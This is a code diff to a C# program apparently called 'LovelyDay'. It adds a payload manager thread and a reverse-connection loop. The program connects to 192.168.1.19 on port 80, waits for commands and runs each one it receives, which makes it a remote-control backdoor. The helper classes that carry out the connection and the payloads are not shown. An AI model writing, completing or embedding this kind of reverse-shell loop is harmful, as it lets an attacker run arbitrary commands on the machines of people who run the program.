@@ -6,34 +6,49 @@ using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Threading;
 using System.Runtime.InteropServices;
+using System.Net;
 
 namespace LovelyDay
 {
     class Program
     {
-        private static bool isRunning = true;
+        private static bool ourExitFlag;
+        private static PayloadManager ourPayloadManager;
+        private static Thread ourPayloadThread;
+        private static string aCommand = "";
 
-        [DllImport("kernel32.dll")]
-        static extern void Sleep(uint dwMilliseconds);
-        
+        static void Init()
+        {
+            ourExitFlag = true;
+            ourPayloadManager = new PayloadManager();
+
+            ourPayloadThread = new Thread(new ThreadStart(() =>
+            {
+                Timer.Update();
+                ourPayloadManager.Update(Timer.GetDeltaTime());
+            }));
+            ourPayloadThread.Start();
+            ReverseManager.Initialize(IPAddress.Parse("192.168.1.19"), 80);
+        }
+
         static void Main(string[] args)
         {
-            while (isRunning)
+            Init();
+            while (ourExitFlag)
             {
                 Update();
             }
         }
 
-        static void Update()
+        private static void Update()
         {
-            Timer.Update();
-
-
+            aCommand = ReverseManager.WaitForCommand();
+            ReverseManager.RunCommand(aCommand);
         }
 
-        public static void Kill()
+        public static void Exit()
         {
-            isRunning = false;
+            ourExitFlag = false;
         }
     }
 }
